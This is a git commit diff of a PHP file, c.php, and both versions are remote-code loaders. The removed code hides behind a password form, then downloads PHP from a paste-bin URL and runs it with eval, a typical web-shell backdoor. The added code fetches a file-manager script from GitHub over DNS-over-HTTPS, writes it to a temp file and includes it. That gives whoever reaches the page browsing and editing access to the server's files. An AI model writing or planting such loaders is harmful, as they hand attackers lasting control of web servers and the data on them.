2b877f6247c28551d4901a0c39a1b4e0a5c791ea
azkagans <83424290+azkagans@users.noreply.github.com>
2026-06-08 03:38:15 +0700

    Update c.php

--- c.php
+++ c.php
@@ -1,80 +1,33 @@
 <?php
-session_start();
 
-/**
- * Disable error reporting
- *
- * Set this to error_reporting( -1 ) for debugging.
- */
-function geturlsinfo($url) {
-    if (function_exists('curl_exec')) {
-        $conn = curl_init($url);
-        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
-        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+set_time_limit(0);
 
-        // Set cookies using session if available
-        if (isset($_SESSION['coki'])) {
-            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
-        }
+$url = "https://raw.githubusercontent.com/prasathmani/tinyfilemanager/refs/heads/master/tinyfilemanager.php";
 
-        $url_get_contents_data = curl_exec($conn);
-        curl_close($conn);
-    } elseif (function_exists('file_get_contents')) {
-        $url_get_contents_data = file_get_contents($url);
-    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
-        $handle = fopen($url, "r");
-        $url_get_contents_data = stream_get_contents($handle);
-        fclose($handle);
-    } else {
-        $url_get_contents_data = false;
-    }
-    return $url_get_contents_data;
+$dns = "https://cloudflare-dns.com/dns-query";
+
+$ch = curl_init($url);
+
+if (defined("CURLOPT_DOH_URL")) {
+  curl_setopt($ch, CURLOPT_DOH_URL, $dns);
 }
 
-// Function to check if the user is logged in
-function is_logged_in()
-{
-    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
-}
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
 
-// Check if the password is submitted
-if (isset($_POST['password'])) {
-    $entered_password = $_POST['password'];
-    $hashed_password = '$2a$12$.3dfbwESAVkDBKPyRTmnmuikubomON.ZLHBvBq84ThgBS2ndmK6Yu';
-    
-    if (password_verify($entered_password, $hashed_password)) {
-        // Password is correct, store it in session
-        $_SESSION['logged_in'] = true;
-        $_SESSION['coki'] = 'asu'; // Replace this with your cookie data
-    } else {
-        // Password is incorrect
-        echo "Incorrect password. Please try again.";
-    }
-}
+$res = curl_exec($ch);
 
-// Check if the user is logged in before executing the content
-if (is_logged_in()) {
-    $a = geturlsinfo('https://bin.mudfish.net/r/195-4113-8218');
-    eval('?>' . $a);
-} else {
-    // Display login form if not logged in
-    ?>
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Login</title>
-    </head>
-    <body>
-        <form method="POST" action="">
-            <label for="password">Password:</label>
-            <input type="password" id="password" name="password">
-            <input type="submit" value="Login">
-        </form>
-    </body>
-    </html>
-    <?php
-}
+curl_close($ch);
+
+
+$tmp = tmpfile();
+
+$path_metadata = stream_get_meta_data($tmp);
+$path = $path_metadata["uri"];
+
+fprintf($tmp, "%s", $res);
+
+include $path;
+
 ?>
